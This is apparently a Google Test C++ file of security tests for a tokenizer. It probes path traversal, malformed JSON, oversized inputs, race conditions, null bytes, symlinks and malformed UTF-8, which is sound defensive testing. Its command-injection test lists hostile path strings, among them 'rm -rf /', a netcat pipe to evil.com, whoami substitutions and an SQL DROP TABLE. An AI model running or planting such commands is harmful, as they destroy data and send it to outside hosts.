#include <gtest/gtest.h>
#include "tokenizer.hpp"
// tokenizer_json_parser is internal to tokenizer.cpp
#include "inference_helpers.hpp"
#include "error_types.hpp"
#include "fixtures/tokenizer_test_base.hpp"
#include "test_data_generators.hpp"
#include <filesystem>
#include <fstream>
#include <thread>
#include <chrono>
#include <atomic>

namespace fs = std::filesystem;

class SecurityCoreTest : public TokenizerTestBase {
protected:
    void SetUp() override {
        TokenizerTestBase::SetUp();
    }
};

TEST_F(SecurityCoreTest, PathTraversalAttempts) {
    auto malicious_paths = TestDataGenerators::GetMaliciousFilePaths();
    
    for (const auto& path : malicious_paths) {
        EXPECT_THROW({
            Tokenizer tokenizer(path);
        }, std::runtime_error) << "Failed to reject malicious path: " << path;
    }
}

TEST_F(SecurityCoreTest, JSONInjectionAttempts) {
    auto json_payloads = TestDataGenerators::GetJSONInjectionPayloads();
    
    for (const auto& payload : json_payloads) {
        fs::path json_path = temp_dir / "malicious.json";
        std::ofstream file(json_path);
        file << payload;
        file.close();
        
        try {
            // Try to load tokenizer with malformed JSON
            Tokenizer tok(json_path.string());
        } catch (...) {
            // Expected to fail or handle gracefully
        }
        
        fs::remove(json_path);
    }
}

TEST_F(SecurityCoreTest, BufferOverflowAttempts) {
    CreateMinimalTokenizer();
    
    // Test with extremely long input strings
    std::vector<size_t> overflow_sizes = {1000, 10000, 100000, 1000000, 10000000};
    
    for (size_t size : overflow_sizes) {
        std::string long_input = TestDataGenerators::GenerateLargeString(size);
        
        EXPECT_NO_THROW({
            auto tokens = tokenizer->encode(long_input);
            EXPECT_FALSE(tokens.empty());
        }) << "Failed with input size: " << size;
    }
}

TEST_F(SecurityCoreTest, IntegerOverflowInTokenization) {
    CreateMinimalTokenizer();
    
    auto overflow_values = TestDataGenerators::GetIntegerOverflowValues();
    
    for (int64_t value : overflow_values) {
        std::string input = std::to_string(value);
        
        EXPECT_NO_THROW({
            auto tokens = tokenizer->encode(input);
            EXPECT_FALSE(tokens.empty());
        }) << "Integer overflow with value: " << value;
    }
}

TEST_F(SecurityCoreTest, MemoryExhaustionProtection) {
    CreateMinimalTokenizer();
    
    // Test with patterns that could cause exponential memory growth
    std::vector<std::string> patterns = {
        std::string(1000, '[') + std::string(1000, ']'),
        "a" + std::string(10000, 'b') + "a",
        std::string(50000, 'x')
    };
    
    for (const auto& pattern : patterns) {
        auto start = std::chrono::steady_clock::now();
        
        EXPECT_NO_THROW({
            auto tokens = tokenizer->encode(pattern);
        });
        
        auto end = std::chrono::steady_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::seconds>(end - start);
        
        EXPECT_LT(duration.count(), 5) << "Operation took too long, possible DoS vulnerability";
    }
}

TEST_F(SecurityCoreTest, RaceConditionInFileAccess) {
    fs::path race_file = temp_dir / "race_test.json";
    
    // Create initial file
    std::ofstream file(race_file);
    file << R"({"model": {"vocab": {"test": 1}, "merges": []}, "added_tokens": []})";
    file.close();
    
    std::atomic<bool> stop_flag(false);
    std::exception_ptr exception;
    
    // Thread that continuously modifies the file
    std::thread modifier([&]() {
        while (!stop_flag) {
            try {
                std::ofstream f(race_file);
                f << R"({"model": {"vocab": {"modified": 2}, "merges": []}, "added_tokens": []})";
                f.close();
                std::this_thread::sleep_for(std::chrono::milliseconds(1));
            } catch (...) {
                exception = std::current_exception();
            }
        }
    });
    
    // Try to load the tokenizer while file is being modified
    for (int i = 0; i < 10; ++i) {
        try {
            Tokenizer tok(race_file.string());
        } catch (const std::exception&) {
            // Expected - file might be in inconsistent state
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }
    
    stop_flag = true;
    modifier.join();
    
    if (exception) {
        FAIL() << "Modifier thread threw an exception";
    }
}

TEST_F(SecurityCoreTest, NullByteInjection) {
    // Test null byte injection in various contexts
    std::vector<std::string> null_byte_inputs = {
        "test\0hidden",
        std::string("before") + '\0' + "after",
        "\0\0\0",
        "normal\0\0\0secret"
    };
    
    CreateMinimalTokenizer();
    
    for (const auto& input : null_byte_inputs) {
        EXPECT_NO_THROW({
            auto tokens = tokenizer->encode(input);
            auto decoded = tokenizer->decode(tokens);
            // Null bytes should be handled safely
        });
    }
}

TEST_F(SecurityCoreTest, FormatStringVulnerabilities) {
    auto format_attacks = TestDataGenerators::GetFormatStringAttacks();
    CreateMinimalTokenizer();
    
    for (const auto& attack : format_attacks) {
        EXPECT_NO_THROW({
            auto tokens = tokenizer->encode(attack);
            auto decoded = tokenizer->decode(tokens);
        }) << "Format string vulnerability with: " << attack;
    }
}

TEST_F(SecurityCoreTest, DeepRecursionProtection) {
    // Create deeply nested JSON structure
    std::string deep_json = "{\"model\": {\"vocab\": {";
    for (int i = 0; i < 10000; ++i) {
        deep_json += "\"token" + std::to_string(i) + "\": " + std::to_string(i);
        if (i < 9999) deep_json += ", ";
    }
    deep_json += "}, \"merges\": []}, \"added_tokens\": []}";
    
    fs::path deep_file = temp_dir / "deep.json";
    std::ofstream file(deep_file);
    file << deep_json;
    file.close();
    
    EXPECT_NO_THROW({
        try {
            Tokenizer tok(deep_file.string());
        } catch (const std::exception& e) {
            // Should handle gracefully without stack overflow
        }
    });
}

TEST_F(SecurityCoreTest, SymbolicLinkAttack) {
    #ifdef _WIN32
    // Windows symbolic link test (requires admin privileges)
    fs::path target = temp_dir / "target.json";
    fs::path link = temp_dir / "link.json";
    
    std::ofstream file(target);
    file << R"({"model": {"vocab": {"test": 1}, "merges": []}, "added_tokens": []})";
    file.close();
    
    try {
        fs::create_symlink(target, link);
        
        // Should handle symlinks safely
        EXPECT_NO_THROW({
            Tokenizer tok(link.string());
        });
        
        fs::remove(link);
    } catch (const fs::filesystem_error&) {
        // Symlink creation might fail without admin rights
        GTEST_SKIP() << "Cannot create symlinks without admin privileges";
    }
    #else
    GTEST_SKIP() << "Test is Windows-specific";
    #endif
}

TEST_F(SecurityCoreTest, CommandInjectionInPaths) {
    std::vector<std::string> injection_paths = {
        "test.json; rm -rf /",
        "test.json && calc.exe",
        "test.json | nc evil.com 1234",
        "test.json`whoami`",
        "test.json$(whoami)",
        "test.json'; DROP TABLE users; --"
    };
    
    for (const auto& path : injection_paths) {
        EXPECT_THROW({
            Tokenizer tok(path);
        }, std::exception) << "Failed to reject command injection: " << path;
    }
}

TEST_F(SecurityCoreTest, ResourceExhaustionProtection) {
    CreateMinimalTokenizer();
    
    // Test with inputs designed to exhaust resources
    const size_t MAX_TOKENS = 1000000;
    std::string repeating = "";
    for (size_t i = 0; i < MAX_TOKENS; ++i) {
        repeating += "a ";
    }
    
    auto start = std::chrono::steady_clock::now();
    
    EXPECT_NO_THROW({
        auto tokens = tokenizer->encode(repeating);
        EXPECT_LE(tokens.size(), MAX_TOKENS * 2); // Should not explode in size
    });
    
    auto duration = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::steady_clock::now() - start);
    EXPECT_LT(duration.count(), 10) << "Tokenization took too long";
}

TEST_F(SecurityCoreTest, MalformedUTF8Handling) {
    auto malformed_sequences = TestDataGenerators::GetMalformedUTF8Sequences();
    CreateMinimalTokenizer();
    
    for (const auto& sequence : malformed_sequences) {
        EXPECT_NO_THROW({
            try {
                auto tokens = tokenizer->encode(sequence);
                auto decoded = tokenizer->decode(tokens);
            } catch (const std::exception&) {
                // Should handle gracefully
            }
        }) << "Failed to handle malformed UTF-8";
    }
}